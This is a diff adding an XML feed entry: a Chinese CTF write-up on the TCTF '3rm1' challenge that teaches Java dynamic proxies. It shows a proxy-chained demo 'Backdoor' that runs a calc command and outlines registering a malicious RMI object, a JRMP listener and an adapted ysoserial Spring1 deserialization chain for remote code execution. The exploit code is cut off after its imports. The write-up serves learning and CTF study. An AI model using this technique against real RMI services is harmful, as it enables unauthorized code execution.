@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>从TCTF的3rm1学习java动态代理</title>
+    <link href="/2022/10/21/2022-10-21-%E4%BB%8ETCTF%E7%9A%843rm1%E5%AD%A6%E4%B9%A0java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
+    <url>/2022/10/21/2022-10-21-%E4%BB%8ETCTF%E7%9A%843rm1%E5%AD%A6%E4%B9%A0java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
+    
+    <content type="html"><![CDATA[<h1 id="从TCTF的3rm1学习java动态代理"><a href="#从TCTF的3rm1学习java动态代理" class="headerlink" title="从TCTF的3rm1学习java动态代理"></a>从TCTF的3rm1学习java动态代理</h1><p>此篇文章首发于<a href="https://tttang.com/archive/1769/">跳跳糖</a>。</p><h2 id="关于java代理"><a href="#关于java代理" class="headerlink" title="关于java代理"></a>关于java代理</h2><blockquote><p>代理模式是常用的 java 设计模式，他的特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。</p></blockquote><p>这里需要关注的重点有如下几点</p><ul><li>代理类与委托类有同样的接口</li><li>代理类主要负责为委托类预处理消息、过滤消息等简而言之经过代理的类方法被调用后会先经过代理类的处理。</li><li>一个代理类的对象与一个委托类的对象关联</li></ul><p>从这里你能够发现其实实现代理模式需要三个东西：一个公共接口，一个具体的类，一个代理类,代理类持有具体类的实例，代为执行具体类实例方法。</p><p>下面是最常见的两种代理模式</p><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>这种代理方式需要代理对象和目标对象实现一样的接口。但是当需要代理的对象过多就需要实现大量的代理类，并且一旦接口增加方法，目标对象与代理对象都要进行修改。</p><p>举个例子学生交作业，一般都是通过学生先交给课代表然后课代表交给老师这种模式，课代表在这里就相当于是一个学生代理类。</p><p>首先你需要一个公共代理接口,这个接口就是学生（被代理类），和课代表（代理类）的公共接口</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Event</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SubmitWork</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后你需要一个学生类,这是被代理类。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Event</span></span>&#123;<br>    String name;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Student</span><span class="hljs-params">(String n)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = n;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SubmitWork</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.name + <span class="hljs-string">&quot;提交作业&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><p>最后你需要一个代理类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StudentInnovation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Event</span></span>&#123;<br>    Student student;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">//收到的作业数量</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">StudentInnovation</span><span class="hljs-params">(Student stu)</span></span>&#123;<br>        <span class="hljs-comment">// 只代理学生对象</span><br>        <span class="hljs-keyword">if</span>(stu.getClass() == Student.class) &#123;<br>            <span class="hljs-keyword">this</span>.student = (Student)stu;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setStudent</span><span class="hljs-params">(Student student)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.student = student;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SubmitWork</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.student.SubmitWork();<br>        <span class="hljs-keyword">this</span>.count += <span class="hljs-number">1</span>;<br>        System.out.println(<span class="hljs-string">&quot;已收作业数量为&quot;</span> + <span class="hljs-keyword">this</span>.count);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>有了这三样东西你就能实现一个简单的代理。简单测试一下。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//被代理的学生张三，他的作业提交由代理对象monitor（课代表）完成</span><br>        Student s1 = <span class="hljs-keyword">new</span> Student(<span class="hljs-string">&quot;张三&quot;</span>);<br>        Student s2 = <span class="hljs-keyword">new</span> Student(<span class="hljs-string">&quot;李四&quot;</span>);<br>        Student s3 = <span class="hljs-keyword">new</span> Student(<span class="hljs-string">&quot;王五&quot;</span>);<br>        <span class="hljs-comment">//生成代理对象，并将张三传给代理对象</span><br>        StudentInnovation monitor = <span class="hljs-keyword">new</span> StudentInnovation(s1);<br>        <span class="hljs-comment">//向课代表提交作业</span><br>        monitor.SubmitWork();<br>        monitor.setStudent(s2);<br>        monitor.SubmitWork();<br>        monitor.setStudent(s3);<br>        monitor.SubmitWork();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/f91db8dc5bf7eecd3b6324a45a71d2d9.png"></p><p>但是你能很明显的感受这样的模式完成代理一个类是很容易的，但如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。并且当接口被改变代理类同样需要改变，这样就产生了更大的局限性和更多麻烦。这就需要动态代理来解决问题了。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>动态代理和静态代理一样也需要三样东西：公共接口，代理对象，代理类。区别就是动态代理是利用反射机制在运行时创建代理类。</p><p>例如这里代理对象类的接口类不变，代理类这样实现。这里使用了jdk原生自带的<code>InvocationHandler</code>，这个类也是文章后面会重点使用到的利用类。这样写就不再局限于一种接口了。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object object;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">//收到的作业数量</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setStudent</span><span class="hljs-params">(Student student)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.object = student;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ProxyHandler</span><span class="hljs-params">(Object object)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object = object;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        method.invoke(object, args);<br>        <span class="hljs-keyword">this</span>.count += <span class="hljs-number">1</span>;<br>        System.out.println(<span class="hljs-string">&quot;已收作业数量为&quot;</span> + <span class="hljs-keyword">this</span>.count);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>进行测试</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//被代理的学生张三，他的作业提交由代理对象monitor（课代表）完成</span><br>        Student s1 = <span class="hljs-keyword">new</span> Student(<span class="hljs-string">&quot;张三&quot;</span>);<br>        InvocationHandler handler = <span class="hljs-keyword">new</span> ProxyHandler(s1);<br>        Event proxyHello = (Event) Proxy.newProxyInstance(s1.getClass().getClassLoader(), s1.getClass().getInterfaces(), handler);<br>        proxyHello.SubmitWork();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/08d76e129f2f0917652df82072490373.png"></p><h3 id="动态代理简单利用"><a href="#动态代理简单利用" class="headerlink" title="动态代理简单利用"></a>动态代理简单利用</h3><p>而有了代理如何进行利用呢，这里简单搭建一个攻击场景。</p><p>首先有两个公共接口</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Teacher</span> </span>&#123;<br>    <span class="hljs-function">Object <span class="hljs-title">getObject</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">attack</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>有一个实现公共接口的类A和一个后门类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Teacher</span></span>&#123;<br>    Object object;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">attack</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;attack&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>有一个后门类,例如这样。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Teacher</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">attack</span><span class="hljs-params">()</span>  </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>有一个可利用的代理类myProxy</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">myProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object object;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">myProxy</span><span class="hljs-params">(Object o)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object = o;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.object;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>有一个代理类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> A object;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ProxyHandler</span><span class="hljs-params">(Object object)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object = (A) object;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;method is &quot;</span> + method.getName());<br>        method.invoke(<span class="hljs-keyword">this</span>.object.getObject(), args);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>很明显我们最终的目的是需要调用到后门类里面的attack方法。这里我们能够控制<code>ProxyHandler.invoke()</code>中的method为attack方法名，因为Teacher接口里面也有attack方法。</p><p>所以关键就是让<code>this.object.getObject()</code>能够返回一个Backdoor后门类实例对象就能完成attack方法调用。所以怎么做呢这里的通常做法就是能够寻找到一个新的代理，我们能够控制这个代理的invoke返回对象，然后用它来代理ProxyHandler中的object，当调用到<code>this.object.getObject()</code>进入到我们找的可利用的代理对象中控制返回对象为一个Backdoor后门类实例。所以很明显这里的<code>myProxy</code>就是那个新的代理。</p><p>最终的利用代码如下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        A t = <span class="hljs-keyword">new</span> A();<br>        Backdoor backdoor = <span class="hljs-keyword">new</span> Backdoor();<br>        InvocationHandler backdoorhandler = <span class="hljs-keyword">new</span> myProxy(backdoor);<br>        Teacher proxyInstance = (Teacher) Proxy.newProxyInstance(backdoor.getClass().getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Teacher.class&#125;, backdoorhandler);<br><br>        InvocationHandler handler = <span class="hljs-keyword">new</span> ProxyHandler(t);<br>        Field field = handler.getClass().getDeclaredField(<span class="hljs-string">&quot;object&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(handler,proxyInstance);<br>        Teacher proxyHello = (Teacher) Proxy.newProxyInstance(t.getClass().getClassLoader(), t.getClass().getInterfaces(), handler);<br>        proxyHello.attack();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/303ff575314a15f60df36c540c43d9ea.png"></p><h2 id="关于题目"><a href="#关于题目" class="headerlink" title="关于题目"></a>关于题目</h2><p>此题最终是4解，最终的做法也是将java动态代理运用的很巧妙，很有趣的一道题。</p><p>题目描述和提示</p><blockquote><p>The server resets every 5 minutes<br>hint 1: <a href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a> page 50<br>hint 2: <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Spring1.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Spring1.java</a></p></blockquote><p>题目给了一个rmi服务，但是题目的远程服务端绑定死了，所以即使控制了lookup的参数也无法进行jndi。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4593853454ad3a6e8108acac6a17ab2f.png"></p><p>但是如果能够在rmi服务端绑定我们的恶意对象，然后恶意对象的地址只想我们的恶意服务（例如jrmp listener），然后在注册端lookup这个对象然后会在我们的恶意服务端返回序列化好的数据让题目客户端反序列化即可进行rce。</p><p>题目给的两个hint很明显契合了这个做法，第一个hint用来绕过高版本jdk限制除本地服务外的其它连接来注册对象。第二个hint用来完成进行rce的反序列化链。</p><h2 id="注册恶意对象"><a href="#注册恶意对象" class="headerlink" title="注册恶意对象"></a>注册恶意对象</h2><p>工具一把梭<a href="https://github.com/qtc-de/remote-method-guesser">https://github.com/qtc-de/remote-method-guesser</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e6774e5a467cf384506982260de5cdbf.png"></p><p>绑定之后，起一个JRMPListener服务使用URLDNS的链子，然后请求我们注册的恶意对象，可以看到题目客户端成功将URLDNS的链子反序列化，很明显此做法是可行的，所以剩下需要做的就是找出找出一条链子进行rce。<br><img src="https://img-blog.csdnimg.cn/img_convert/d3d738912a3fff862a653073b51f6312.png"></p><h2 id="反序列化链的尝试"><a href="#反序列化链的尝试" class="headerlink" title="反序列化链的尝试"></a>反序列化链的尝试</h2><p>这个是这个题目的难点，题目给的提示是spring1的链子，所以必然需要先了解这条链子。</p><h3 id="关于spring1"><a href="#关于spring1" class="headerlink" title="关于spring1"></a>关于spring1</h3><p>这条链子在JDK 8u66之前是可以使用的。</p><p>链子调用如下图，最终利用TemplatesImpl.newTransformer()来实例化恶意字节码，链子主要靠的是使用InvocationHandler层层代理。<br><img src="https://img-blog.csdnimg.cn/img_convert/f6314eeaad9ab1953936debe72438977.png"></p><p>使用ysoserial项目调试。程序反序列化的入口为<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code><br><img src="https://img-blog.csdnimg.cn/img_convert/29bcd405051401a51f7c2ce5829f52ab.png"></p><p>此时可以看到总共是有三层代理的。<br><img src="https://img-blog.csdnimg.cn/img_convert/065b1abd4cf2d1d1c86c2e925bc8810e.png"></p><p>在<code>this.provider.getType().getClass()</code>存在第一层代理，在invoke里会返回一个<code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>代理，这个代理的invoke是最终执行命令的方法。</p><p>从上图也可以看到最后一层代理是代理objectFactory的getObject方法，然后返回一个templates，此时method又被设置为newTransformer，所以就能成功实例化恶意字节码。<br><img src="https://img-blog.csdnimg.cn/img_convert/f8eddc6de749816742e30ccc031332cc.png"></p><p>接着往下调试，第一次代理返回就是上面所说的<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code><br><img src="https://img-blog.csdnimg.cn/img_convert/27848b914b4b420e562e9083e24e22ac.png"></p><p>然后在<code>ReflectionUtils.findMethod</code>中会获取到newTransformer方法，因为代理类实例化时传入了接口。<br><img src="https://img-blog.csdnimg.cn/img_convert/79c703fc974d097f27a5c2403542b101.png"><br>然后还会调用一次getType，调用过程和第一次是一样的返回对象也是一样的，都是返回了一个代理对象。<br>重要的是在调用<code> ReflectionUtils.invokeMethod</code>时，可以看到此时的method已经被代理<br><img src="https://img-blog.csdnimg.cn/img_convert/56a4e7cf7b0e7a243dcd15d902dab3bf.png"></p><p>所以会再次跳转到代理类的invoke，这里就是我们最终能够成功调用templates的newtransformer的地方。可以看到这里调用到了getObject方法，但是objectFactory已经被代理所以这里的getObject方法返回的类也可以被控制，让其返回一个templatesImpl实例对象即可。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4da951ce74a800d5cb41f9213cca6a0d.png"></p><p>进入到getObject代理中，看到从HashMap中取出来templatesImpl实例对象<br>。<br><img src="https://img-blog.csdnimg.cn/img_convert/cbebd76a11603a1ec95794fefca36ffa.png"></p><p>后面就是经典的利用templatesImpl实例化恶意字节码来进行rce的做法了。<br><img src="https://img-blog.csdnimg.cn/img_convert/8a7a092a65e683884c86b6ec975177cc.png"></p><h3 id="回到题目，比赛时错误的做法。"><a href="#回到题目，比赛时错误的做法。" class="headerlink" title="回到题目，比赛时错误的做法。"></a>回到题目，比赛时错误的做法。</h3><p>说是错误做法就是没有注意到题目jdk版本导致写出来的链子有个类在jdk202下被更改过了导致无法使用，不过还是值得记录一下。</p><p>题目的readObject入口是这样的，和spring1的链子对比一下，可以看到几乎一摸一样。这里的<code>getGirlFriend</code>就相当于时<code>getType</code>方法<br><img src="https://img-blog.csdnimg.cn/img_convert/d7fe176153f5bfe352012ce771733828.png"></p><p>同时看到题目提供的一些接口，几乎和spring1如出一辙，区别就是这些都是出题者自己实现的。<br><img src="https://img-blog.csdnimg.cn/img_convert/f6d3139e2f145fbe1e74c5fc11d83d77.png"></p><p>但是相比于spring1还差一个可以最终rce的反射调用方法。再看代码发现出题者实现了<code>MyInvocationHandler</code>，所以很明显需要用的都提供了剩下的就是改改实例化类的名字了。<br><img src="https://img-blog.csdnimg.cn/img_convert/814080a2cbfe065ef5b83e169e55bf9c.png"></p><p>exp代码如下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> com.ctf.threermi.*;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Gadgets;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.JavaVersion;<br><span class="hljs-keyword">import</span> 